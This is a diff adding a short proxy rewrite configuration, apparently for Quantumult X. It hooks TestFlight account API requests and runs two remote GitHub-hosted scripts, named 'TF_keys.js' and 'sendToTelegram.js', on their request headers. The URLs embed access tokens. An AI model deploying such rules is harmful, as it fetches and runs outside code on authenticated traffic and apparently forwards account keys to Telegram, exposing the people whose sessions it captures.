@@ -1,0 +1,4 @@
+hostname = testflight.apple.com
+
+^https?:\/\/testflight\.apple\.com\/v3\/accounts\/.*\/apps$ url script-request-header https://raw.githubusercontent.com/yuichydev/quanx/main/TF_keys.js?token=GHSAT0AAAAAACSZQYESUWHBBPJNM5APKJ4UZUWKVEQ
+^https?:\/\/testflight\.apple\.com\/v3\/accounts\/.*\/apps$ url script-request-header https://raw.githubusercontent.com/yuichydev/quanx/main/sendToTelegram.js?token=GHSAT0AAAAAACSZQYESEYP5B7J4MPEUO5LIZUWKVFA
